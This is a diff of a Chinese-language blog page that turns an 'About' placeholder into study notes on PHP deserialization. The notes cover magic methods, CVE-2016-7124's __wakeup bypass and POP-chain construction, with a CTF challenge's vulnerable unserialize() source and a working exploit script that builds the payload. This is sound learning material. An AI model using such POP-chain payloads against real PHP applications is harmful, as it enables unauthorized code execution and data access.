@@ -3,7 +3,7 @@
 <html lang="zh-CN">
     <head>
         <meta charset="UTF-8" />
-        <title>About | 遗世独立の幻想乡</title>
+        <title>反序列化 | 遗世独立の幻想乡</title>
         <meta name="author" content="CloudFlowing" />
         <meta name="description" content="" />
         <meta name="keywords" content="" />
@@ -20,6 +20,10 @@
 
 
 <script src="/blog/js/lib/preview.js"></script>
+
+
+
+
 
 
 
@@ -140,22 +144,193 @@
 
                 <div class="article">
     <div>
-        <h1>About</h1>
+        <h1>反序列化</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2023/3/14
+            2023/3/16
         </span>
         
+        <span class="category">
+            <a href="/blog/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                学习笔记
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Web/" style="color: #00bcd4">Web</a>
+            </span>
+            
+        </span>
         
     </div>
     
     <div class="content" v-pre>
-        <h1 id="待施工，博主是个鸽子"><a href="#待施工，博主是个鸽子" class="headerlink" title="待施工，博主是个鸽子"></a>待施工，博主是个鸽子</h1><h2 id="咕，咕，咕"><a href="#咕，咕，咕" class="headerlink" title="咕，咕，咕"></a>咕，咕，咕</h2>
+        <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/LJH1999ZN/article/details/123338591">反序列化</a></h1><blockquote>
+<p>O(对象):(类的字符长度):(类名):(项数):{s&#x2F;i(字符串&#x2F;数字):(长度):(内容);}</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><pre><code class="php">$a=new wllm()	//自定义参数实例化类
+$a-&gt;admin=&quot;admin&quot;;		//调用指针指向变量或方法并赋值
+$b=serialize($a);
+</code></pre>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul>
+<li><p>__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法</p>
+<ul>
+<li>eval:代码执行</li>
+</ul>
+</li>
+<li><p>__construst():具有构造函数的类在创建新对象的时候，回调此方法</p>
+</li>
+<li><p>__destruct():反序列化的时候，或者对象销毁的时候调用</p>
+</li>
+<li><p><strong>__wakeup()</strong>:反序列化的时候调用</p>
+<ul>
+<li>当序列化字符串中表示对象属性个数的值大于真实的属性个数会跳过_wakeup的执行（CVE-2016-7124）(版本：<strong>PHP5 &lt; 5.6.25</strong>  <strong>PHP7 &lt; 7.0.10</strong>)</li>
+</ul>
+</li>
+<li><p>__sleep():序列化的时候调用</p>
+</li>
+<li><p>__toString():把类当成字符串的时候调用</p>
+<ul>
+<li>一般在echo处生效</li>
+</ul>
+</li>
+<li><p>__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</p>
+</li>
+<li><p>__get():读取不可访问或者不存在的属性的时候，进行赋值</p>
+</li>
+<li><p>__call():在对象中调用一个不存在或不可访问的方法的时候，会被执行</p>
+</li>
+</ul>
+<h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62422842/article/details/123988229?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166876201416782428623647%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166876201416782428623647&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-123988229-null-null.142%5Ev65%5Eopensearch_v2,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=pop%E9%93%BE&spm=1018.2226.3001.4187">POP链</a></h2><ul>
+<li><p>public:公有的类成员可以在任何地方被访问</p>
+</li>
+<li><p>protected:受保护的类成员则可以被其自身以及其子类和父类访问</p>
+<p>.*.</p>
+</li>
+<li><p>private:私有的类成员则只能被其定义所在的类访问</p>
+<p>.类名.</p>
+<ul>
+<li><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度：即%00</p>
+<p>因此需要<code>urlencode</code></p>
+</li>
+</ul>
+</li>
+<li><p>入口： __destruct()或___wakeup()</p>
+</li>
+<li><p>出口：__invoke()</p>
+</li>
+<li><p>通过this-&gt;指针调用其他类构造pop链</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.ctfer.vip/problem/440">例题源码</a></p>
+<pre><code class="php"> &lt;?php
+
+error_reporting(0);
+show_source(&quot;index.php&quot;);
+
+class w44m&#123;
+
+    private $admin = &#39;aaa&#39;;
+    protected $passwd = &#39;123456&#39;;
+
+    public function Getflag()&#123;
+        if($this-&gt;admin === &#39;w44m&#39; &amp;&amp; $this-&gt;passwd ===&#39;08067&#39;)&#123;
+            include(&#39;flag.php&#39;);
+            echo $flag;
+        &#125;else&#123;
+            echo $this-&gt;admin;
+            echo $this-&gt;passwd;
+            echo &#39;nono&#39;;
+        &#125;
+    &#125;
+&#125;
+
+class w22m&#123;
+    public $w00m;
+    public function __destruct()&#123;
+        echo $this-&gt;w00m;
+    &#125;
+&#125;
+
+class w33m&#123;
+    public $w00m;
+    public $w22m;
+    public function __toString()&#123;
+        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();
+        return 0;
+    &#125;
+&#125;
+
+$w00m = $_GET[&#39;w00m&#39;];
+unserialize($w00m);
+
+?&gt; 
+</code></pre>
+<p>exp</p>
+<pre><code class="php">&lt;?php
+class w44m&#123;
+
+    private $admin = &#39;w44m&#39;;
+    protected $passwd = &#39;08067&#39;;
+
+    public function Getflag()&#123;		//公共方法
+        if($this-&gt;admin === &#39;w44m&#39; &amp;&amp; $this-&gt;passwd ===&#39;08067&#39;)&#123;
+            echo $flag;
+        &#125;else&#123;
+            echo $this-&gt;admin;
+            echo $this-&gt;passwd;
+            echo &#39;nono&#39;;
+        &#125;
+    &#125;
+&#125;
+
+class w22m&#123;
+    public $w00m;
+    public function __destruct()&#123;
+        echo $this-&gt;w00m;
+    &#125;
+&#125;
+
+class w33m&#123;
+    public $w00m;
+    public $w22m = &quot;Getflag&quot;;	//指向Getflag方法
+    public function __toString()&#123;
+        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();
+        return 0;
+    &#125;
+&#125;
+$a=new w44m();
+$b=new w22m();
+$c=new w33m();
+$c-&gt; w00m=$a;	//调用w33m中的w22m使其指向方法
+$b-&gt; w00m=$c;   //调用w22m中的w00m使结果echo
+echo urlencode(serialize($b));
+?&gt;
+</code></pre>
+<hr>
+
     </div>
+    
+    
+    
+    
+    
     
     
 </div>
@@ -189,6 +364,12 @@
             
         </div>
         <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
          
     <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
